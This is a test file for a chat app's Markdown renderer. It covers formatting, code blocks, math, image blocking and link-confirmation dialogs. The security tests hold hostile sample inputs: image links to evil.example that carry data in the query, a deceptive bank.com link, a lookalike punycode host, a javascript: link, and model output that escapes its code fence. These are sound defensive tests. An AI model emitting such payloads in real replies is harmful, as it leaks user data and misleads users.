import { beforeEach, describe, expect, it, vi } from "vitest";
import { act, render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import "../i18n";
import Markdown from "./Markdown";

const { openLink, copyText } = vi.hoisted(() => ({
  openLink: vi.fn().mockResolvedValue(undefined),
  copyText: vi.fn().mockResolvedValue(true),
}));

vi.mock("../lib/api", () => ({ api: { openLink } }));
vi.mock("../lib/clipboard", () => ({ copyText }));

beforeEach(() => {
  openLink.mockClear();
  copyText.mockClear();
});

describe("Markdown", () => {
  it("renders GFM: bold, lists and tables", () => {
    render(
      <Markdown>{"**bold**\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |"}</Markdown>,
    );
    expect(screen.getByText("bold").tagName).toBe("STRONG");
    expect(screen.getByText("one").closest("ul")).toBeInTheDocument();
    expect(screen.getByRole("table")).toBeInTheDocument();
  });

  it("wraps a wide table in a keyboard-focusable scrollable container", () => {
    render(<Markdown>{"| a | b |\n|---|---|\n| 1 | 2 |"}</Markdown>);
    const wrap = screen.getByRole("table").closest(".md-table-wrap");
    expect(wrap).toBeInTheDocument();
    expect(wrap).toHaveAttribute("tabIndex", "0");
    expect(wrap).toHaveAccessibleName();
  });

  it("makes a fenced code block's <pre> keyboard-focusable for horizontal scrolling", () => {
    render(<Markdown>{"```ts\nconst x = 1;\n```"}</Markdown>);
    const pre = document.querySelector("pre");
    expect(pre).toHaveAttribute("tabIndex", "0");
    expect(pre).toHaveAccessibleName();
  });

  it("gives a fenced code block a language label and a working copy button", async () => {
    const user = userEvent.setup();
    render(<Markdown>{"```ts\nconst x = 1;\n```"}</Markdown>);

    expect(screen.getByText("ts")).toBeInTheDocument();
    await user.click(screen.getByTitle("Copy code"));
    expect(copyText).toHaveBeenCalledWith("const x = 1;");
  });

  it("copies a multi-line, multi-token code block back out byte-for-byte", async () => {
    const user = userEvent.setup();
    const source = ['function greet(name) {', '  // say hello', '  return `hi, ${name}`;', '}'].join(
      "\n",
    );
    render(<Markdown>{"```js\n" + source + "\n```"}</Markdown>);

    await user.click(screen.getByTitle("Copy code"));
    expect(copyText).toHaveBeenCalledWith(source);
  });

  it("omits the language pill for an untagged fence, without crashing", async () => {
    const user = userEvent.setup();
    render(<Markdown>{"```\nplain output\n```"}</Markdown>);

    expect(document.querySelector(".md-code-lang")).not.toBeInTheDocument();
    await user.click(screen.getByTitle("Copy code"));
    expect(copyText).toHaveBeenCalledWith("plain output");
  });

  it("does not crash on an unrecognized fence language", () => {
    render(<Markdown>{"```notalanguage\nsome text\n```"}</Markdown>);
    expect(screen.getByText("notalanguage")).toBeInTheDocument();
    expect(screen.getByText("some text")).toBeInTheDocument();
  });

  it("tolerates an unterminated fence while a reply is still streaming", () => {
    const chunks = ["```js\n", "```js\nconst x", "```js\nconst x = 1", "```js\nconst x = 1;\n```"];
    for (const chunk of chunks) {
      const { unmount } = render(<Markdown>{chunk}</Markdown>);
      unmount();
    }
  });

  it("does not wrap inline code in the code-block chrome", () => {
    render(<Markdown>{"before `inline` after"}</Markdown>);
    expect(screen.queryByTitle("Copy code")).not.toBeInTheDocument();
    expect(screen.getByText("inline").tagName).toBe("CODE");
  });

  it("syntax-highlights a bash fence", () => {
    render(<Markdown>{'```bash\necho "hi"\n```'}</Markdown>);
    expect(screen.getByText("bash")).toBeInTheDocument();
    expect(document.querySelector(".hljs-string")).toBeInTheDocument();
  });

  it("syntax-highlights a ts fence", () => {
    render(<Markdown>{"```ts\nconst x: number = 1;\n```"}</Markdown>);
    expect(document.querySelector(".hljs-keyword")).toBeInTheDocument();
  });

  it("syntax-highlights an html fence", () => {
    render(<Markdown>{'```html\n<div class="x">hi</div>\n```'}</Markdown>);
    expect(document.querySelector(".hljs-tag")).toBeInTheDocument();
    expect(document.querySelector(".hljs-attr")).toBeInTheDocument();
  });

  it("renders inline math with KaTeX", () => {
    render(<Markdown>{"The bound is $T_{max}$ per token."}</Markdown>);
    expect(document.querySelector(".katex")).toBeInTheDocument();
    expect(document.querySelector(".katex-display")).not.toBeInTheDocument();
  });

  it("renders block math with KaTeX in display mode", () => {
    render(<Markdown>{"$$\nT_{max} = \\frac{R_{io}}{Data_{token}}\n$$"}</Markdown>);
    expect(document.querySelector(".katex-display")).toBeInTheDocument();
  });

  // CommonMark's math extension only treats `$$` as display math when each
  // delimiter sits alone on its own line — `$$formula$$` crammed onto one
  // line is technically just inline math with a 2-char delimiter. Models
  // overwhelmingly emit a standalone equation this way (as does this task's
  // own example), so Markdown promotes a line that's *only* `$$...$$` to
  // display math before handing it to remark-math.
  it("promotes a standalone single-line $$...$$ to display math", () => {
    render(<Markdown>{"$$T_{max} = \\frac{R_{io}}{Data_{token}}$$"}</Markdown>);
    expect(document.querySelector(".katex-display")).toBeInTheDocument();
  });

  it("leaves $$...$$ mixed into running prose as inline math", () => {
    render(<Markdown>{"The bound is $$T_{max}$$ per token, roughly."}</Markdown>);
    expect(document.querySelector(".katex")).toBeInTheDocument();
    expect(document.querySelector(".katex-display")).not.toBeInTheDocument();
  });

  it("does not rewrite a $$...$$-looking line inside a fenced code block", async () => {
    const user = userEvent.setup();
    render(<Markdown>{"```text\n$$not math$$\n```"}</Markdown>);
    expect(document.querySelector(".katex")).not.toBeInTheDocument();
    await user.click(screen.getByTitle("Copy code"));
    expect(copyText).toHaveBeenCalledWith("$$not math$$");
  });

  // A shorter fence of the *same* character nested inside a longer one (e.g. a
  // 3-backtick example inside a 4-backtick wrapper, common when a reply shows
  // markdown syntax) doesn't close the outer fence — so a $$...$$-looking line
  // in between is still code content, not a math line to rewrite.
  it("does not rewrite a $$...$$-looking line inside a nested (shorter) fence", async () => {
    const user = userEvent.setup();
    render(<Markdown>{"````markdown\n```\n$$E=mc^2$$\n```\n````"}</Markdown>);
    expect(document.querySelector(".katex")).not.toBeInTheDocument();
    await user.click(screen.getByTitle("Copy code"));
    expect(copyText).toHaveBeenCalledWith("```\n$$E=mc^2$$\n```");
  });

  it("does not crash on invalid LaTeX", () => {
    render(<Markdown>{"$\\frac{1}{$"}</Markdown>);
    expect(document.querySelector(".md")).toBeInTheDocument();
  });

  it("tolerates unterminated display math while streaming", () => {
    const chunks = [
      "The bound is $$T",
      "The bound is $$T_{max",
      "The bound is $$T_{max} = \\frac{a}{b}$$",
    ];
    for (const chunk of chunks) {
      const { unmount } = render(<Markdown>{chunk}</Markdown>);
      unmount();
    }
  });

  it("leaves in-page fragment links to default browser handling", () => {
    render(<Markdown>{"[jump](#usage)"}</Markdown>);
    const link = screen.getByRole("link", { name: "jump" });
    expect(link).toHaveAttribute("href", "#usage");

    const clickEvent = new MouseEvent("click", { bubbles: true, cancelable: true });
    link.dispatchEvent(clickEvent);

    expect(clickEvent.defaultPrevented).toBe(false);
    expect(openLink).not.toHaveBeenCalled();
  });
});

describe("Markdown images", () => {
  it("never renders an <img>: a placeholder with the alt text stands in", () => {
    const { container } = render(
      <Markdown>{"![sales chart](https://evil.example/x.png?d=secret)"}</Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
    const placeholder = screen.getByRole("img", { name: "Image not shown: sales chart" });
    expect(placeholder).toHaveTextContent("Image not shown: sales chart");
    expect(placeholder).toHaveAttribute("title", "Images here aren't loaded, so nothing is sent to another site.");
  });

  it("says just 'Image not shown' without alt text", () => {
    render(<Markdown>{"![](https://evil.example/x.png)"}</Markdown>);
    expect(screen.getByRole("img", { name: "Image not shown" })).toBeInTheDocument();
  });

  it("blocks reference-style images and images inside links", () => {
    const { container } = render(
      <Markdown>{"![a][pic]\n\n[![b](https://evil.example/b.png)](https://evil.example/)\n\n[pic]: https://evil.example/a.png"}</Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getAllByRole("img")).toHaveLength(2);
  });

  it("blocks images in update notes too", () => {
    const { container } = render(
      <Markdown confirmLinks={false}>{"![x](https://example.com/x.png)"}</Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
  });

  it("does not render raw HTML images either", () => {
    const { container } = render(<Markdown>{'<img src="https://evil.example/x.png">'}</Markdown>);
    expect(container.querySelector("img")).toBeNull();
  });
});

describe("Markdown links", () => {
  const dialog = () => screen.getByRole("alertdialog");

  it("asks before opening an http(s) link, and opens only on confirm", async () => {
    const user = userEvent.setup();
    render(<Markdown>{"[go](https://example.com/path?q=1)"}</Markdown>);

    const link = screen.getByRole("link", { name: "go" });
    const clickEvent = new MouseEvent("click", { bubbles: true, cancelable: true });
    act(() => void link.dispatchEvent(clickEvent));
    expect(clickEvent.defaultPrevented).toBe(true);
    expect(openLink).not.toHaveBeenCalled();
    expect(dialog()).toHaveAccessibleName("Open this link?");

    await user.click(screen.getByRole("button", { name: "Open link" }));
    expect(openLink).toHaveBeenCalledTimes(1);
    expect(openLink).toHaveBeenCalledWith("https://example.com/path?q=1");
    expect(screen.queryByRole("alertdialog")).not.toBeInTheDocument();
  });

  it("never puts the address in a live href, and shows it as the tooltip", () => {
    const { container } = render(<Markdown>{"[go](https://example.com/a)"}</Markdown>);
    const link = screen.getByRole("link", { name: "go" });
    expect(link).not.toHaveAttribute("href");
    expect(link).toHaveAttribute("title", "https://example.com/a");
    expect(link).toHaveAttribute("tabIndex", "0");
    expect(container.querySelector("[href]")).toBeNull();
  });

  it("asks for every shape of http(s) link, autolinks included", async () => {
    const user = userEvent.setup();
    const links = [
      "https://example.com/?q=secret",
      "https://example.com/secret/path",
      "https://secret.example.com/",
    ];
    for (const href of links) {
      const { unmount } = render(<Markdown>{`[x](${href})`}</Markdown>);
      await user.click(screen.getByRole("link", { name: "x" }));
      expect(dialog()).toBeInTheDocument();
      unmount();
    }
    render(<Markdown>{"see www.example.com"}</Markdown>);
    await user.click(screen.getByRole("link", { name: "www.example.com" }));
    expect(dialog()).toBeInTheDocument();
    expect(openLink).not.toHaveBeenCalled();
  });

  it("shows the host, the full address and the three choices", async () => {
    const user = userEvent.setup();
    render(<Markdown>{"[go](https://trusted.com@xn--exmple-cua.com/c?d=my%20chat)"}</Markdown>);
    await user.click(screen.getByRole("link", { name: "go" }));

    expect(dialog()).toHaveAccessibleDescription(/goes to: xn--exmple-cua\.com$/);
    expect(dialog()).toHaveTextContent("https://trusted.com@xn--exmple-cua.com/c?d=my%20chat");
    expect(screen.getAllByRole("button").map((b) => b.textContent)).toEqual(["Cancel", "Copy address", "Open link"]);
  });

  it("shows an IDN host in its xn-- form", async () => {
    const user = userEvent.setup();
    render(<Markdown>{"[go](https://exämple.com/)"}</Markdown>);
    await user.click(screen.getByRole("link", { name: "go" }));
    expect(dialog()).toHaveAccessibleDescription(/xn--exmple-cua\.com/);
  });

  it("starts focus on the dialog, not on Open, and Escape cancels back to the link", async () => {
    const user = userEvent.setup();
    render(<Markdown>{"[go](https://example.com)"}</Markdown>);
    const link = screen.getByRole("link", { name: "go" });
    link.focus();
    await user.keyboard("{Enter}");

    expect(dialog()).toHaveFocus();
    await user.keyboard("{Escape}");
    expect(screen.queryByRole("alertdialog")).not.toBeInTheDocument();
    expect(openLink).not.toHaveBeenCalled();
    expect(link).toHaveFocus();
  });

  it("cancels from the Cancel button and from the scrim", async () => {
    const user = userEvent.setup();
    render(<Markdown>{"[go](https://example.com)"}</Markdown>);
    await user.click(screen.getByRole("link", { name: "go" }));
    await user.click(screen.getByRole("button", { name: "Cancel" }));
    expect(screen.queryByRole("alertdialog")).not.toBeInTheDocument();

    await user.click(screen.getByRole("link", { name: "go" }));
    await user.click(document.querySelector(".modal-backdrop") as Element);
    expect(screen.queryByRole("alertdialog")).not.toBeInTheDocument();
    expect(openLink).not.toHaveBeenCalled();
  });

  it("copies the full address", async () => {
    const user = userEvent.setup();
    render(<Markdown>{"[go](https://example.com/a?b=c)"}</Markdown>);
    await user.click(screen.getByRole("link", { name: "go" }));
    await user.click(screen.getByRole("button", { name: "Copy address" }));
    expect(copyText).toHaveBeenCalledWith("https://example.com/a?b=c");
    expect(screen.getByRole("button", { name: "Copied" })).toBeInTheDocument();
    expect(openLink).not.toHaveBeenCalled();
  });

  it("says so when the link text names a different host", async () => {
    const user = userEvent.setup();
    render(<Markdown>{"[https://bank.com/login](https://evil.example/c)"}</Markdown>);
    await user.click(screen.getByRole("link", { name: "https://bank.com/login" }));
    const warning = "The link shows bank.com, but it really goes to evil.example.";
    expect(dialog()).toHaveTextContent(warning);
    expect(dialog()).toHaveAccessibleDescription(new RegExp(warning.replace(/\./g, "\\.")));
  });

  it("does not warn about text that only looks like a file name", async () => {
    const user = userEvent.setup();
    render(<Markdown>{"[README.md](https://example.com/README.md)"}</Markdown>);
    await user.click(screen.getByRole("link", { name: "README.md" }));
    expect(dialog()).not.toHaveTextContent("really goes to");
  });

  it("warns about a local address, and still opens it", async () => {
    const user = userEvent.setup();
    render(<Markdown>{"[admin](http://192.168.1.1/admin)"}</Markdown>);
    await user.click(screen.getByRole("link", { name: "admin" }));
    expect(dialog()).toHaveTextContent("This address points to this computer or your local network.");
    await user.click(screen.getByRole("button", { name: "Open link" }));
    expect(openLink).toHaveBeenCalledWith("http://192.168.1.1/admin");
  });

  it("opens a mixed-case scheme after confirmation, normalized", async () => {
    const user = userEvent.setup();
    render(<Markdown>{"[go](HTTPS://Example.com/Path)"}</Markdown>);
    await user.click(screen.getByRole("link", { name: "go" }));
    await user.click(screen.getByRole("button", { name: "Open link" }));
    expect(openLink).toHaveBeenCalledWith("https://example.com/Path");
  });

  it("opens update-note links directly, without asking", async () => {
    const user = userEvent.setup();
    render(<Markdown confirmLinks={false}>{"[notes](https://example.com/notes)"}</Markdown>);
    await user.click(screen.getByRole("link", { name: "notes" }));
    expect(screen.queryByRole("alertdialog")).not.toBeInTheDocument();
    expect(openLink).toHaveBeenCalledWith("https://example.com/notes");
  });

  it.each([
    ["mailto", "[x](mailto:a@example.com)"],
    ["relative", "[x](docs/guide.md)"],
    ["protocol-relative", "[x](//evil.example/c)"],
    ["stripped javascript:", "[x](javascript:alert(1))"],
    ["empty", "[x]()"],
  ])("leaves a link inert (%s): no href, no dialog, no open", async (_kind, source) => {
    const user = userEvent.setup();
    const { container } = render(<Markdown>{source}</Markdown>);
    const link = container.querySelector("a");
    expect(link).not.toBeNull();
    expect(link).not.toHaveAttribute("href");
    await user.click(link as Element);
    expect(screen.queryByRole("alertdialog")).not.toBeInTheDocument();
    expect(openLink).not.toHaveBeenCalled();
  });

  it("opens nothing on middle-click", async () => {
    const user = userEvent.setup();
    render(<Markdown>{"[go](https://example.com)"}</Markdown>);
    await user.pointer({ keys: "[MouseMiddle]", target: screen.getByRole("link", { name: "go" }) });
    expect(screen.queryByRole("alertdialog")).not.toBeInTheDocument();
    expect(openLink).not.toHaveBeenCalled();
  });

  // The artifact preview wraps model-written content in a 4-backtick fence
  // (ChatView.tsx); content that closes it early renders as Markdown.
  it("applies the image and link rules after content closes the artifact fence early", async () => {
    const user = userEvent.setup();
    const content = "safe\n````\n![x](https://evil.example/i.png)\n[go](https://evil.example/c)";
    const { container } = render(<Markdown>{`\`\`\`\`md\n${content}\n\`\`\`\``}</Markdown>);
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByRole("img", { name: "Image not shown: x" })).toBeInTheDocument();
    await user.click(screen.getByRole("link", { name: "go" }));
    expect(dialog()).toBeInTheDocument();
    expect(openLink).not.toHaveBeenCalled();
  });
});
